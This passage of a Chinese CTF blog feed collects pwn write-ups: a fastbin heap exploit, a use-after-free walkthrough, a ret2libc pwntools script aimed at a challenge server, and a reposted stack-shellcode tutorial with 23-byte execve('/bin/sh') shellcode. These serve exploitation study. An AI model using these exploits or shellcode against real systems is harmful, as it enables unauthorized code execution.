class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fill</span>(<span class="hljs-params">idx,content</span>):</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sh.sendline(<span class="hljs-built_in">str</span>(idx))<br>sh.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>sh.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>sh.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>sh.sendline(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sh.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dump</span>(<span class="hljs-params">idx</span>):</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sh.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#00x00</span><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#10x20</span><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#20x40</span><br>allocate(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#30x60</span><br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p8(<span class="hljs-number">0x60</span>)fill(<span class="hljs-number">0</span>,payload)<br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">1</span>,payload)<br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">1</span>,payload)<br>allocate(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#4</span><br>free(<span class="hljs-number">3</span>)<br>dump(<span class="hljs-number">2</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;Content: \n&#x27;</span>)<br>main_arena = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">88</span><br>log.success(<span class="hljs-string">&#x27;main arena: &#x27;</span>+<span class="hljs-built_in">hex</span>(main_arena))<br>libc_base = main_arena - <span class="hljs-number">0x3c4b20</span><br>log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>one_gadget = libc_base + <span class="hljs-number">0x4526a</span> <span class="hljs-comment"># 0x4526a 0xf02a4 0xf1147 0x45216</span><br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#3</span><br>free(<span class="hljs-number">3</span>)<br>fake_chunk_addr = main_arena - <span class="hljs-number">0x33</span><br>payload = p64(fake_chunk_addr)<br>fill(<span class="hljs-number">2</span>,payload)<br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#3</span><br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#5</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x13</span>+p64(one_gadget)<br>fill(<span class="hljs-number">5</span>,payload)<br>allocate(<span class="hljs-number">0x10</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>堆之UAF(Use_after_free)及调试-hitcontraining_uaf</title>
    <link href="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/"/>
    <url>/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://wiki.x10sec.org/pwn/heap/use_after_free/">https://wiki.x10sec.org/pwn/heap/use_after_free/</a></p><p><strong>一个很直接的想法是修改note的put字段为magic函数的地址，从而实现在执行print note 的时候执行magic函数。</strong> 那么该怎么执行呢？</p><p>我们可以简单来看一下每一个note生成的具体流程</p><ol><li><p>程序申请8字节内存用来存放note中的put以及content指针。</p></li><li><p>程序根据输入的size来申请指定大小的内存，然后用来存储content。</p></li></ol>   <figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+-----------------+                       <br>|<span class="hljs-string">   put           </span>|<span class="hljs-string">                       </span><br><span class="hljs-string">+-----------------+                       </span><br>|<span class="hljs-string">   content       </span>|<span class="hljs-string">       size              </span><br><span class="hljs-string">+-----------------+-------------------&gt;+----------------+</span><br><span class="hljs-string">                                       </span>|<span class="hljs-string">     real       </span>|<br>                                       |<span class="hljs-string">    content     </span>|<br>                                       |<span class="hljs-string">                </span>|<br>                                       +----------------+<br></code></pre></td></tr></table></figure><p>那么，根据我们之前在堆的实现中所学到的，显然note是一个fastbin chunk（大小为16字节）。我们的目的是希望一个note的put字段为magic的函数地址，那么我们必须想办法让某个note的put指针被覆盖为magic地址。由于程序中只有唯一的地方对put进行赋值。所以我们必须利用写real content的时候来进行覆盖。具体采用的思路如下</p><ul><li>申请note0，real content size为16（大小与note大小所在的bin不一样即可）</li><li>申请note1，real content size为16（大小与note大小所在的bin不一样即可）</li><li>释放note0</li><li>释放note1</li><li>此时，大小为16的fast bin chunk中链表为note1-&gt;note0</li><li>申请note2，并且设置real content的大小为8，那么根据堆的分配规则</li><li>note2其实会分配note1对应的内存块。</li><li>real content 对应的chunk其实是note0。</li><li>如果我们这时候向note3的chunk部分写入magic的地址，那么由于我们没有note1为NULL。当我们再次尝试输出note1的时候，程序就会调用magic函数。</li></ul></blockquote><h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201220702851.png" class="" title="image-20200201220702851"><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201221032403.png" class="" title="image-20200201221032403"><p>free了但没有设置为0，所以存在uaf</p><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201221102009.png" class="" title="image-20200201221102009"><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201221149782.png" class="" title="image-20200201221149782"><p>在这里，<code>notelist[i][0]</code>存放的是puts函数的地址，<code>notelist[i][1]</code>存放的就是指向content的地址</p><p>先申请两个0x10的空间，内容为aaaa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201220613982.png" class="" title="image-20200201220613982"><p>最下面的是top chunk，我们申请了的两块0x10空间，还有两块是因为下图，并且，堆块地址向上生长</p><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201221459981.png" class="" title="image-20200201221459981"><p>所以，最先的<code>0x826300</code>和<code>0x826328</code>应该就是最先分配的notelist[i]，里面存放着指向print_note_content的地址，<code>0x826310</code>和<code>0x826338</code>就是我们自己申请的堆了</p><p>然后在我们delete了这两个堆块之后，（由于重新运行程序所以地址改变</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201224306213.png" class="" title="image-20200201224306213"><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201224344952.png" class="" title="image-20200201224344952"><p><code>0x902e010</code>（我们申请的）和<code>0x902e00</code>（存放puts地址的）先进入fastbins单链表</p><p>然后此时我们再<code>add(8,p32(shell))</code></p><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201225157906.png" class="" title="image-20200201225157906"><img src="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/image-20200201225221156.png" class="" title="image-20200201225221156"><p><code>0x87d0028</code>先出来，储存print地址，然后再<code>0x87d0000</code>,储存magic地址</p><p>最后，我们再print heap0时，就跳转到了magic地址上面去了</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BrainOverFlow_Vol.1_BUU特供</title>
    <link href="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/"/>
    <url>/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/</url>
    
    <content type="html"><![CDATA[<p>很有意思（好玩）的游戏，感谢札哥的题</p><img src="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/image-20200130195435399.png" class="" title="image-20200130195435399"><p>btw，我也没想到我会是第六个解出来的hhhhh，我可以吹一个月（笑</p><p>剧情我就不说了，反正很有意思的</p><p>具体东西都藏在/www/data里边，每一次的地图数据（主要在Map013，15，22）都有，个人等级，姓名，武器售卖价值等都可以改hhhhh</p><p>亏我三小时打通游戏，做了半天pwn以为是盲打，然后发现了文件就在图片旁边orz</p><h2 id="protect"><a href="#protect" class="headerlink" title="protect"></a>protect</h2><img src="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/image-20200130200100596.png" class="" title="image-20200130200100596"><img src="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/image-20200130195934944.png" class="" title="image-20200130195934944"><img src="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/image-20200130195944896.png" class="" title="image-20200130195944896"><p>这图就是溢出点，buf空间只有0x40，但是却读入0xC8个，题目没有system和/bin/sh字段，就是ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./protect&#x27;</span>)<br>lib = <span class="hljs-number">0</span><br>sh = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip,port,debug</span>):</span><br>    <span class="hljs-keyword">global</span> lib<br>    <span class="hljs-keyword">global</span> sh<br>    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>        sh = process(<span class="hljs-string">&#x27;./protect&#x27;</span>)<br>        lib = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        sh = remote(ip,port)<br>        lib = ELF(<span class="hljs-string">&#x27;/home/mrbelieve/Desktop/PWN/buu/libc/64-libc-2.23.so&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&quot;options&quot;</span>)<br>    sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    sh.recvuntil(<span class="hljs-string">&quot;Password.&quot;</span>)<br>    pop_rdi = <span class="hljs-number">0x0000000000400a43</span> <span class="hljs-comment"># 通过ROPgadget获得</span><br>    payload = cyclic(<span class="hljs-number">0x40</span> + <span class="hljs-number">8</span>)<br>    payload += p64(pop_rdi)<br>    payload += p64(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>])<br>    payload += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>    payload += p64(<span class="hljs-number">0x40094B</span>)<br>    <span class="hljs-comment">#pause()</span><br>    sh.sendline(payload)<br>    __libc_start_main = u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) <br>    libc = __libc_start_main - lib.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>    system = libc + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    binsh = libc + lib.search(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>).<span class="hljs-built_in">next</span>()<br>    log.success(<span class="hljs-string">&quot;libc: &quot;</span> + <span class="hljs-built_in">hex</span>(libc))<br>    log.success(<span class="hljs-string">&quot;system: &quot;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&quot;binsh: &quot;</span> + <span class="hljs-built_in">hex</span>(binsh))<br>    sh.recvuntil(<span class="hljs-string">&quot;options&quot;</span>)<br>    sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    sh.recvuntil(<span class="hljs-string">&quot;Password.&quot;</span>)<br>    payload = cyclic(<span class="hljs-number">0x40</span> + <span class="hljs-number">8</span>)<br>    payload += p64(pop_rdi)<br>    payload += p64(binsh)<br>    payload += p64(system)<br>    <span class="hljs-comment">#pause()</span><br>    sh.sendline(payload)<br>    sh.interactive()<br><span class="hljs-keyword">if</span> __name__ ==  <span class="hljs-string">&quot;__main__&quot;</span>:<br>    pwn(<span class="hljs-string">&quot;123.206.21.178&quot;</span>,<span class="hljs-number">10000</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><blockquote><p><a href="https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#_9">https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#_9</a></p><p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而 libc 在github上有人进行收集，如下</li><li><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system函数的地址。</p><p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p><p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p><ul><li><a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></li></ul><p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p><p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p><ul><li>泄露 __libc_start_main 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 /bin/sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘/bin/sh’)</li></ul></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn_by_examples</title>
    <link href="/2020/01/28/pwn_by_examples/"/>
    <url>/2020/01/28/pwn_by_examples/</url>
    
    <content type="html"><![CDATA[<p>x64参数按在rdi,rsi,rdx,rcs,r8,r9依次储存</p><h2 id="IDA部分"><a href="#IDA部分" class="headerlink" title="IDA部分"></a>IDA部分</h2><p>shift f12 字符串</p><p>n 重命名</p><p>x 查看引用</p><h2 id="bash部分"><a href="#bash部分" class="headerlink" title="bash部分"></a>bash部分</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cyclic 200 <span class="hljs-comment">#生成循环 200个</span><br>cyclic -l xxxxx <span class="hljs-comment">#计算偏移</span><br></code></pre></td></tr></table></figure><h2 id="PWNTOOLS部分"><a href="#PWNTOOLS部分" class="headerlink" title="PWNTOOLS部分"></a>PWNTOOLS部分</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">u64 <br><span class="hljs-keyword">asm</span> <br>disasm <br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br>rop = ROP(elf)<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * offset<br>payload += p32(elf.plt[<span class="hljs-string">&#x27;gets&#x27;</span>])<br>payload += p32(rop.search(<span class="hljs-number">8</span>).address)<br>payload += p32(elf.bss() + <span class="hljs-number">0x100</span>)<br>payload += p32(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br>payload += p32(<span class="hljs-number">0</span>)<br>payload += p32(elf.bss() + <span class="hljs-number">0x100</span>)<br>sh.sendline(payload)<br><br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>先执行了pop_ret 然后执行gets，并放到了bss()+ 0x100的地方。随后system(elf.bss()+ 0x100)</p><h2 id="pwndbg部分"><a href="#pwndbg部分" class="headerlink" title="pwndbg部分"></a>pwndbg部分</h2><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>jmp esp</p><p>函数返回的时候esp会刚好指向返回地址的下一个地址</p><img src="/2020/01/28/pwn_by_examples/image-20200125172524547.png" class="" title="image-20200125172524547"><hr><blockquote><p>作者：看雪学院<br>链接：<a href="https://www.jianshu.com/p/1bdac9837eff">https://www.jianshu.com/p/1bdac9837eff</a><br>来源：简书</p></blockquote><h2 id="第一题（堆栈直接执行shellcode）"><a href="#第一题（堆栈直接执行shellcode）" class="headerlink" title="第一题（堆栈直接执行shellcode）"></a>第一题（堆栈直接执行shellcode）</h2><p>接下来这题，我们再轻松一点，可以直接在堆栈中执行程序。</p><p>pwn5（参考“阅读原文”）</p><p>继续前面的套路。</p><p><strong>第一步，查看保护</strong></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-41da81266dc47fff?imageMogr2/auto-orient/strip%7CimageView2/2/w/644/format/webp" alt="img"></p><p>发现，可以直接在堆栈上执行程序了，开启的是PIE，地址随机化的保护。</p><p><strong>第二步，判断漏洞函数。</strong></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-8b1062016fc33b8b?imageMogr2/auto-orient/strip%7CimageView2/2/w/480/format/webp" alt="img"></p><p>发现函数是read，仅仅读取0x40（64）个字节。</p><p><strong>第三步，计算目标变量的在堆栈中距离ebp的偏移</strong></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-14fee87811eb443d?imageMogr2/auto-orient/strip%7CimageView2/2/w/388/format/webp" alt="img"></p><p>EBP的内容为：0x3761413661413561</p><blockquote><p>$ python patternLocOffset.py -l 700 -s 0x3761413661413561</p><p>[*] Create pattern string contains 700 characters ok!</p><p>[*] No exact matches, looking for likely candidates…</p><p>[+] Possible match at offset 16 (adjusted another-endian)</p><p>[+] take time: 0.0005 s</p></blockquote><p>距离EBP的偏移是16个字节，距离存放的返回地址是16+8=24个字节。</p><p>这里可以发现IDA分析的又是正确的了，0x10个字节。</p><p><strong>第四步和第五步，分析是否已经载入了可以利用的函数</strong></p><p>如system，execve等</p><p>发现，并没有上述函数。但是由于堆栈可以执行，因此我们可以考虑直接将shellcode阻止在payload里面。因此，这里和第五步分析是否有字符串/bin/sh合并了，我们可以自己放置字符串，并且调用对应的地址了。</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-15f527ac95286278?imageMogr2/auto-orient/strip%7CimageView2/2/w/448/format/webp" alt="img"></p><p>理论上，我们可以直接利用pwntools产生的shellcode来进行部署，但是这道题有点特殊。在返回地址之后所剩余的空间=64-24-8=32个字节（返回地址还要占用8个字节），因此实际部署shellcode的长度还剩下32个字节，使用pwntools产生的shellcode有44个字节，太长了。因此，我们可以从网上找到更短的shellcode：</p><blockquote><p># 23 bytes</p><p># <a href="https://www.exploit-db.com/exploits/36858/">https://www.exploit-db.com/exploits/36858/</a></p><p>shellcode_x64 = “\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p></blockquote><p>它的汇编形式是：</p><blockquote><p># char *const argv[]</p><p>xorl %esi, %esi</p><p>#</p><p> ‘h’ ‘s’ ‘/‘ ‘/‘ ‘n’ ‘i’ ‘b’ ‘/‘</p><p>movq $0x68732f2f6e69622f, %rbx</p><p>#</p><p> for ‘\x00’</p><p>pushq %rsi</p><p>pushq %rbx</p><p>pushq %rsp</p><p>#</p><p> const char *filename</p><p>popq %rdi</p><p>#</p><p> __NR_execve 59</p><p>pushq $59</p><p>popq %rax</p><p>#</p><p> char *const envp[]</p><p>xorl %edx, %edx</p><p>syscall</p></blockquote><p>好了，shellcode确定好了，我们现在还有一个问题。Shellcode执行的地址如何确定呢？shellcode的地址，其实就是buf的地址加上32个字节的偏移。</p><p>我们前面发现，该程序是动态改变地址的，因此静态的确认buf地址是不可行的，进而静态的确认shellcode的地址是不可行的。</p><p>处理到这里好像有点死胡同了，我们发现程序中有printf函数，理论上可以利用它来打印buf的地址，然后实时的计算buf+32的地址，就能够得到shellcode的地址。但是，我们回头看看程序本身的执行，会发现：</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-e928c61d7e0eba62?imageMogr2/auto-orient/strip%7CimageView2/2/w/729/format/webp" alt="img"></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-6fa118c955729fc4?imageMogr2/auto-orient/strip%7CimageView2/2/w/506/format/webp" alt="img"></p><p>它实际上已经为我们解决了这个问题，自己输出了buf的地址（= = CTF题目的难易程度真的是微妙之间呀）。</p><p>那么，我们的exp思路就是： 实时读取buf的地址，计算buf+32得到shellcode的地址，放置在payload中。</p><blockquote><p>from pwn import *</p><p>code = ELF(‘./pwn5’)</p><p># 23 bytes</p><p># <a href="https://www.exploit-db.com/exploits/36858/">https://www.exploit-db.com/exploits/36858/</a></p><p>shellcode_x64 = “\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p><p>sh.recvuntil(‘[‘)</p><p>buf_addr = sh.recvuntil(‘]’, drop=True)</p><p>buf_addr = int(buf_addr, 16)</p><p>payload = ‘b’ * 24 + p64(buf_addr + 32) + shellcode_x64</p><p>sh.sendline(payload)</p><p>sh.interactive()</p></blockquote><p>堆栈的布置图，以及地址的相对位置，以buf为起点。</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-bb20383a152f69a1?imageMogr2/auto-orient/strip%7CimageView2/2/w/699/format/webp" alt="img"></p><p>第二题（控制esp进行精准打击）</p><p>接下来，我们来点有难度的。在这个程序中，我们的payload实在放不下了，即使是23字节，那么怎么办呢？</p><p>pwn6（参考“阅读原文”）</p><p>继续前面的过程：</p><p><strong>第一步：检测保护情况</strong></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-803630bd28a73fb7?imageMogr2/auto-orient/strip%7CimageView2/2/w/520/format/webp" alt="img"></p><p>发现，是个三无程序。么有任何保护，看起来很简单？哈哈，并没有。看官请继续。</p><p><strong>第二步，判断漏洞函数</strong></p><p>如gets,scanf等：</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-4208fca26260a9d6?imageMogr2/auto-orient/strip%7CimageView2/2/w/313/format/webp" alt="img"></p><p>发现是fgets函数，仅仅读取50个字节的字符长度。</p><p><strong>第三步</strong></p><p>计算目标变量的在堆栈中距离ebp的偏移。</p><p>方法和前面类似，发现偏移距离ebp是0x20，那么距离ret_addr就是0x20+4=0x24（36）字节了。</p><p><strong>第四步和第五步</strong></p><p>分析是否已经载入了可以利用的函数。发现并没有：</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-ec80829673fdb148?imageMogr2/auto-orient/strip%7CimageView2/2/w/461/format/webp" alt="img"></p><blockquote><p>$ ROPgadget –binary stack_pivoting_1 –string ‘/bin/sh’</p><p>Strings information</p><p>============================================================</p></blockquote><p>字符串自然也是没有的。</p><p>我们考虑利用shellcode，好像可以类似于上一题的操作了。但是并不能，留给我们布置shellcode的长度为50-36-4=10字节（同样有4个字节的返回地址存放）！尴尬不==，放两个地址就没有位置了。但如果你能够厉害到用10个字节做shellcode，请大胆分享出来！</p><p>那么怎么办呢？</p><p>既然，堆栈溢出的位置不行了，那么我们就把shellcode放在栈里面吧！因为堆栈具有可执行的权限，因此这样完全是可行的。</p><p>这里，我先放图出来解释一下思路：</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-605a219a5314b46c?imageMogr2/auto-orient/strip%7CimageView2/2/w/679/format/webp" 